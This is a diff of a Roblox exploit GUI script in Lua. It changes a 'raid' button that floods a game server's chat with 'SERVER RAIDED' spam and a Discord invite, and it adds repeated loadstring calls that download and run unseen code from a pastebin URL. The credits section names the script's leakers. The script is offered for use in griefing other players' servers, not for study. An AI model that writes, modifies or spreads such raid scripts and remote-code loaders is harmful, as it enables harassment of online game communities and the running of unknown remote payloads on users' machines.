@@ -178,11 +178,15 @@ local Tab1Section2 = Tab1:NewSection("DANGEROUS SECTION") -- Create a new sectio
 Tab1Section2:NewButton("All in one. [CANNOT BE STOPPED]", "why u click", function()
     -- script here
     local i = 1
-    while i <= 90 do
-        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("! SERVER RAIDED TO AVOID LEAVE THE SERVER.", "All")
+    while i <= 50 do
+        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("! .gg/Jpxrg3cJ || EZ RAID LOL || SERVER RAIDED.", "All")
         i = i + 1
     end
 
+    loadstring(game:HttpGet("https://pastebin.com/raw/zqyDSUWX"))()
+    wait(10)
+    loadstring(game:HttpGet("https://pastebin.com/raw/zqyDSUWX"))()
+    wait(10)
     loadstring(game:HttpGet("https://pastebin.com/raw/zqyDSUWX"))()
 end)
 
@@ -199,7 +203,7 @@ Tab2Section:NewButton("NAMELESS ADMIN", "why u click this", function()
 end)
 
 local Tab3 = Window:NewTab("Credits")
-local Tab3Section = Tab3:NewSection("Made by Flavorleaks.")
+local Tab3Section = Tab3:NewSection("Made by leakz.")
 local Tab3Section = Tab3:NewSection("Subcribe for more script like this.")
 local Tab3Section = Tab3:NewSection("DM 12PT#8260 IF BUGS/GLITCHES.")
-local Tab3Section = Tab3:NewSection("I DONT KNOW WHAT IM DOING.") 
+local Tab3Section = Tab3:NewSection("CREDITS TO THE OWNER OF CHAT GUI AND FLING.") 
